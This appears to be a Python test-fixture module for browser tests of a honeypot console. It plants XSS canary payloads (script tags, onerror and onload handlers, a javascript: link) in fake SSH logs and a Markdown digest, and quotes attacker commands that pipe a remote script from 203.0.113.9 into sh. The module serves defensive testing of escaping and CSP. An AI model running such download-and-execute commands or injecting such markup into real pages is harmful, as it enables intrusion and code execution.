"""Canary payloads and a page watcher shared by the browser tests."""

from __future__ import annotations

import datetime
import uuid
from dataclasses import dataclass, field

from console_lab import Lab
from ui_fixture import SCRIPT, _append, map_lines, ssh_lines

# Payloads whose only effect, if the console ever inserted them as markup, is to set a
# global the tests read back. Pages built with bypass_csp run them if they get in, so the
# check covers the console's own escaping as well as its CSP.
CANARY_SCRIPT = "<script>window.__winnie_xss = 'script'</script>"
CANARY_ATTR = "\"><img src=x onerror=\"window.__winnie_xss = 'attr'\">"
CANARY_SVG = "'><svg onload=\"window.__winnie_xss = 'svg'\"></svg>"
CANARY_USER = "<b onmouseover=\"window.__winnie_xss = 'user'\">admin</b>"
CANARIES = (CANARY_SCRIPT, CANARY_ATTR, CANARY_SVG)
CANARY_SOURCE = "198.51.100.66"
CANARY_SESSION = f"session-{uuid.UUID(int=0xCA7).hex}"


def plant_canaries(lab: Lab) -> None:
    """Append one SSH session whose login and commands are the canary payloads."""
    start_at = lab.tree.now - datetime.timedelta(minutes=30)
    _append(lab.tree.log, ssh_lines(CANARY_SESSION, CANARY_SOURCE, start_at,
                                    [(CANARY_USER, CANARY_ATTR, True)], list(CANARIES)))


def plant_map_events(lab: Lab, now: datetime.datetime | None = None) -> None:
    """Append located events from the last two minutes for the map, then one canary login
    and command from the source whose place is a script tag."""
    now = now or datetime.datetime.now(datetime.timezone.utc)
    _append(lab.tree.log, map_lines(now - datetime.timedelta(seconds=110), 40, step=2.5))
    _append(lab.tree.log, ssh_lines(f"session-{uuid.UUID(int=0xCA8).hex}", CANARY_SOURCE,
                                    now - datetime.timedelta(seconds=8),
                                    [(CANARY_USER, CANARY_ATTR, False)], [SCRIPT]))



@dataclass
class Watched:
    """What a page did that a clean console never does."""
    console_errors: list[str] = field(default_factory=list)
    failed: list[str] = field(default_factory=list)
    dialogs: list[str] = field(default_factory=list)

    def problems(self) -> list[str]:
        return self.console_errors + self.failed + self.dialogs


def watch(page) -> Watched:
    seen = Watched()

    def on_console(msg):
        if msg.type in ("error", "warning") or "Content Security Policy" in msg.text:
            seen.console_errors.append(f"console {msg.type}: {msg.text}")

    def on_dialog(dialog):
        seen.dialogs.append(f"dialog {dialog.type}: {dialog.message}")
        dialog.dismiss()

    page.on("console", on_console)
    page.on("pageerror", lambda exc: seen.console_errors.append(f"page error: {exc}"))
    page.on("requestfailed", lambda req: seen.failed.append(
        f"failed {req.method} {req.url}: {req.failure}"))
    page.on("response", lambda res: res.status >= 400 and seen.failed.append(
        f"{res.status} {res.request.method} {res.url}"))
    page.on("dialog", on_dialog)
    return seen


# ---- a digest with every Markdown construct the console formats --------------------------

DIGEST_DAY = "2026-01-15"
DIGEST_RECORD = "session-00000000000000000000000000d16e57"
DIGEST_SCRIPT = "<script>window.__winnie_xss = 'digest'</script>"
DIGEST_IMG = "<img src=x onerror=\"window.__winnie_xss = 'digest-img'\">"
DIGEST_LONG = "A" * 6000


def digest_fixture() -> str:
    """A digest in the writer's shape (agents/triage.py digest), with the constructs it never
    writes and hostile text in code spans, plain text, link targets and table cells."""
    rows = "\n".join(f"| 198.51.100.{n % 250} | ssh | {n} | `user{n}` | {n * 3} | ok |" for n in range(200))
    nested = "\n".join("  " * depth + f"- level {depth + 1}" for depth in range(5))
    return f"""# Honeypot digest {DIGEST_DAY}

Records: 4 (2 SSH sessions, 2 campaigns). LLM-triaged: 3.
Analyses reused: 1 (a stored model answer for a repeated command sequence, no model call).

| Judgement | Count |
|---|---|
| MALICIOUS | 2 |
| SUSPICIOUS | 1 |
| BENIGN | 1 |

## Top three needing attention

1. MALICIOUS / EXECUTION / ssh from `198.51.100.7` (`{DIGEST_RECORD}`) **HONEYTOKEN USED**
   - **`Downloader fetched and ran a **payload** <b>bold</b>`** (MALICIOUS)
   - Who: `198.51.100.7, Example Net, NL`
   - Volume: 1 session, 14 commands, 2 logins
   - What they did
     - `wget http://203.0.113.9/x.sh -O- | sh`
     - `echo {DIGEST_SCRIPT}`
   - Finding: `{DIGEST_IMG}`
   - high-signal: `download_execute`x1
2. SUSPICIOUS / DISCOVERY / ssh from `198.51.100.8` (`session-00000000000000000000000000000b0b`)
   - `uname -a; cat /proc/cpuinfo \\| grep name`

## Notes

Plain *italic*, __bold__, _also italic_ and `code` with an escaped \\*star\\*.
Open [the first record](#/records/{DIGEST_RECORD}), [the day before](#/digests/2026-01-14) or
[the queue](#/queue). These stay text: [guide](https://example.com/guide),
[run](javascript:window.__winnie_xss='link'), [bad route](#/records/<script>),
![tracker](https://example.com/t.png) and <a href="#/" onclick="window.__winnie_xss='a'">a tag</a>.
Entities stay as typed: &lt;b&gt; &amp; &#60;script&#62;.
{DIGEST_SCRIPT}
{DIGEST_IMG}

> Quoted analyst note with `code` and **weight**.
> > A nested quote.

---

```sh
curl -s http://203.0.113.9/x.sh | sh
<script>window.__winnie_xss = 'fence'</script>
```

Nested five deep:

{nested}

Long value: `{DIGEST_LONG}`

## Sources

| Source | Service | Sessions | User | Commands | State |
|:---|:---:|---:|---|---:|---|
{rows}

### ftp
- usernames: `admin` (3), `{DIGEST_SCRIPT}` (1)
- passwords: `pass0` (1)
- pairs: 
"""
